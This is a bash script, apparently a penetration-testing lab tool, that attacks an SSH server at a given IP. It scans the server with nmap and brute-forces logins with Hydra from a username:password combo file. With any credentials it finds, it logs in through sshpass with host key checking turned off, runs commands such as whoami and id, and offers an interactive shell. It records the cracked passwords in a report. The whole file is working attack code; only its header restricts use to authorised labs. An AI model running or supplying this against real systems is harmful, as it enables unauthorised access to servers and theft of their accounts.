#!/usr/bin/env bash
# ssh_checks.sh — SSH server assessment (OpenSSH 6.6.1p1)
# Supports combo mode (Hydra + USERPASS_FILE) for faster verification.
# Now also executes proof commands (id, whoami, pwd, uname -a) on success.
#
# Usage:
#   ./ssh.sh <TARGET_IP> [USERS_FILE|COMBO_FILE] [PASS_FILE]
#
# Example:
#   ./ssh.sh 192.168.43.192 combo.txt
#
# Legal: Use only in your own lab or with explicit authorization.

set -euo pipefail
die(){ echo "[!] $*" >&2; exit 1; }
have(){ command -v "$1" >/dev/null 2>&1; }

# --- Args ---
TGT="${1:-}"; A2="${2:-}"; A3="${3:-}"
[[ -n "$TGT" ]] || die "Usage: $0 <TARGET_IP> [USERS_FILE|COMBO_FILE] [PASS_FILE]"

COMBO="${A2:-}"; IS_COMBO=0
if [[ -n "${COMBO}" && -f "${COMBO}" ]] && grep -q ':' "${COMBO}"; then
  IS_COMBO=1
fi

USERS=""; PASS=""
if [[ $IS_COMBO -eq 0 ]]; then
  USERS="${A2:-}"; PASS="${A3:-}"
fi

# --- Tool checks ---
have nmap   || die "Missing tool: nmap"
HYDRA=0; have hydra && HYDRA=1
MSF=0;   have msfconsole && MSF=1
SSHPASS=0; have sshpass && SSHPASS=1

# --- Setup dirs ---
TS="$(date +%Y%m%d-%H%M%S)"
ROOT="ssh_checks_${TS}_${TGT}"
mkdir -p "$ROOT/scan" "$ROOT/msf" "$ROOT/proof"
REPORT="$ROOT/REPORT.md"

echo "[*] Target SSH: ${TGT}:22"
echo "[*] Artifacts -> $ROOT"

################################
# Step 1: Nmap Recon
################################
echo "[*] Step 1/4: Recon..."
SCAN="$ROOT/scan/ssh_nmap.txt"
nmap -p22 -sV --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods "$TGT" -oN "$SCAN" >/dev/null 2>&1 || true

################################
# Step 2: Credential Checks
################################
VALID_CREDS="$ROOT/proof/ssh_valid_creds.txt"
FOUND=0
USER=""; PASS=""

if [[ $IS_COMBO -eq 1 && $HYDRA -eq 1 ]]; then
  echo "[*] Step 2/4: Using Hydra with combo file..."
  hydra -C "$COMBO" -t 4 -f ssh://"$TGT" | tee "$ROOT/hydra.log"
  CREDS_LINE="$(grep -m1 'login:' "$ROOT/hydra.log" || true)"
  if [[ -n "$CREDS_LINE" ]]; then
    USER="$(echo "$CREDS_LINE" | awk '{print $5}')"
    PASS="$(echo "$CREDS_LINE" | awk '{print $7}')"
    echo "$USER:$PASS" | tee "$VALID_CREDS"
    FOUND=1
    echo "[+] Valid SSH creds: $USER:$PASS"
  fi
fi

################################
# Step 3: Proof Commands
################################
if [[ $FOUND -eq 1 && $SSHPASS -eq 1 ]]; then
  echo "[*] Step 3/4: Running proof commands on $TGT ..."
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$USER@$TGT" \
    'echo "[== PROOF ==]"; whoami; id; pwd; uname -a' \
    2>/dev/null | tee "$ROOT/proof/proof_ssh.txt"

  echo "[*] Proof saved -> $ROOT/proof/proof_ssh.txt"

  # Optional: Open an interactive shell
  read -p "Do you want to open an interactive SSH shell now? [y/N] " ans
  if [[ "$ans" =~ ^[Yy]$ ]]; then
    sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$USER@$TGT"
  fi
fi

################################
# Step 4: Report
################################
echo "[*] Step 4/4: Writing report..."

{
  echo "# SSH Assessment — $TGT"
  echo
  echo "## Recon"
  echo "Nmap scan saved at: $SCAN"
  echo
  echo "## Credential Checks"
  if [[ $FOUND -eq 1 ]]; then
    echo "Valid credentials found: $USER:$PASS"
  else
    echo "No valid credentials confirmed."
  fi
  echo
  echo "## Proof"
  if [[ -f "$ROOT/proof/proof_ssh.txt" ]]; then
    echo "See proof file: $ROOT/proof/proof_ssh.txt"
  fi
} > "$REPORT"

echo
echo "==== DONE ===="
echo "• Nmap scan    : $SCAN"
[[ -s "$VALID_CREDS" ]] && echo "• Valid creds  : $VALID_CREDS"
[[ -f "$ROOT/proof/proof_ssh.txt" ]] && echo "• Proof file   : $ROOT/proof/proof_ssh.txt"
echo "• Report       : $REPORT"
